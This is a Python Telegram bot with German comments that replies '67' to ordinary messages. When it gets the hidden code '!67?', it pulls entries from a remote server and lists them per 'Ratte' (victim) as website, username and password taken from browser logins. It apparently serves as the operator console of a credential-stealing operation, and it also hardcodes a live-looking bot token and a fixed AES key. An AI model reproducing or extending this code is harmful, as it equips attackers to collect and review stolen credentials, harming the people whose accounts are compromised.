# ENI & LO – Der 67-Bot (mit Crypto, falls benötigt)

import os
import sys
import subprocess
import requests

# ============================================================
# MODULE INSTALLIEREN (immer)
# ============================================================
def install_modules():
    print("🔧 Prüfe und installiere Module...")
    modules = [
        "python-telegram-bot==20.7",
        "pycryptodome"  # Crypto – falls du es doch brauchst
    ]
    for module in modules:
        print(f"📦 Installiere {module}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", module])
        print(f"✅ {module} installiert.")
    print("✅ Alle Module sind installiert.")

# ============================================================
# MODULE IMPORTIEREN
# ============================================================
try:
    from telegram import Update
    from telegram.ext import Application, MessageHandler, filters, CallbackContext
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
except ImportError as e:
    print(f"❌ Fehler beim Importieren: {e}")
    install_modules()
    from telegram import Update
    from telegram.ext import Application, MessageHandler, filters, CallbackContext
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad

# ============================================================
# KONFIGURATION
# ============================================================
BOT_TOKEN = "8989933992:AAGwMOfvrQPylnxZOrbGLj-BSNAY8MC2MF8"
SECRET_CODE = "!67?"

# Der Daten-Server – HIER DIE URL EINTRAGEN
SERVER_URL = "https://DEIN_SERVER_NAME.railway.app"

# Crypto-Schlüssel (nur für den Fall, dass du sie wieder aktivierst)
SECRET_KEY = "ENI_LO_SECRET_2026_ULTRA"
IV = "1234567890123456"

# ============================================================
# ENTSCHLÜSSELUNG (optional – falls du sie wieder brauchst)
# ============================================================
def decrypt(encrypted_data):
    try:
        encrypted_bytes = base64.b64decode(encrypted_data)
        cipher = AES.new(SECRET_KEY.encode('utf-8'), AES.MODE_CBC, IV.encode('utf-8'))
        decrypted = cipher.decrypt(encrypted_bytes)
        decrypted = unpad(decrypted, AES.block_size)
        return decrypted.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"[Entschlüsselungsfehler: {str(e)}]"

# ============================================================
# BOT-FUNKTIONEN
# ============================================================
async def handle_message(update: Update, context: CallbackContext):
    user_message = update.message.text

    # ============================================================
    # 1. GEHEIMER CODE – !67?
    # ============================================================
    if user_message == SECRET_CODE:
        try:
            # Daten vom Server abrufen
            response = requests.get(f"{SERVER_URL}/get", timeout=10)
            if response.status_code != 200:
                await update.message.reply_text("❌ Fehler beim Abrufen der Daten.")
                return

            data = response.json()
            if not data:
                await update.message.reply_text("📭 Keine Daten vorhanden.")
                return

            # Daten formatieren
            response_text = "🐀 *ENI & LO – Daten vom Server*\n\n"
            for ratte_id, entries in data.items():
                response_text += f"📌 *Ratte {ratte_id}*\n"
                for entry in entries:
                    content = entry.get("data", "")
                    timestamp = entry.get("timestamp", "")
                    source = entry.get("source", "Browser-Login")

                    # Wenn Daten verschlüsselt sind, entschlüsseln
                    # (aktuell deaktiviert – Klartext)
                    # content = decrypt(content)  # auskommentiert

                    response_text += f"   📂 {source}\n"
                    if "|" in content:
                        parts = content.split("|", 2)
                        if len(parts) >= 3:
                            response_text += f"   🌐 {parts[0]}\n"
                            response_text += f"   👤 {parts[1]}\n"
                            response_text += f"   🔑 {parts[2]}\n"
                        else:
                            response_text += f"   📋 {content}\n"
                    else:
                        response_text += f"   📋 {content}\n"
                    response_text += f"   🕒 {timestamp}\n\n"

            if len(response_text) > 4000:
                parts = [response_text[i:i+4000] for i in range(0, len(response_text), 4000)]
                for part in parts:
                    await update.message.reply_text(part, parse_mode='Markdown')
            else:
                await update.message.reply_text(response_text, parse_mode='Markdown')

        except Exception as e:
            await update.message.reply_text(f"❌ Fehler: {str(e)}")
        return

    # ============================================================
    # 2. ALLE ANDEREN NACHRICHTEN – 67
    # ============================================================
    await update.message.reply_text("67")

# ============================================================
# MAIN
# ============================================================
def main():
    print("🐀 ENI & LO – Der 67-Bot (mit Crypto, falls benötigt)")
    print("=" * 50)
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print(f"Server URL: {SERVER_URL}")
    print("=" * 50)
    print("Bot läuft... Drücke Ctrl+C zum Beenden.")

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
